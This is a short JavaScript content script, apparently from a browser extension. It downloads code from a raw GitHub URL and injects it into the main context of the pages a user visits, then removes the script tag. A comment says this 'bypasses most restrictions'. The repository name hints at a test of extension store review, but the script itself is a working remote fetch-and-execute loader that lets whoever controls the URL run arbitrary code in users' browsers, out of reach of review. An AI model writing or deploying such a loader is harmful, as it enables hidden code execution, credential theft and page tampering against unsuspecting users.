// content.js – Bundled locally, fetches & runs your dynamic GitHub code
(() => {
  const REMOTE_CODE_URL = "https://raw.githubusercontent.com/cwsctstest002/Testingdec2025/main/dynamic-red.js?t=" + Date.now();

  fetch(REMOTE_CODE_URL)
    .then(r => {
      if (!r.ok) throw new Error("Failed to fetch remote code");
      return r.text();
    })
    .then(remoteCode => {
      // Execute the fetched code in the MAIN page context (bypasses most restrictions)
      const script = document.createElement('script');
      script.textContent = `(function() { ${remoteCode} })();`;
      (document.head || document.documentElement).appendChild(script);
      script.remove();  // Clean up
      console.log("Dynamic red script executed from GitHub!");
    })
    .catch(err => console.error("Remote code error:", err));
})();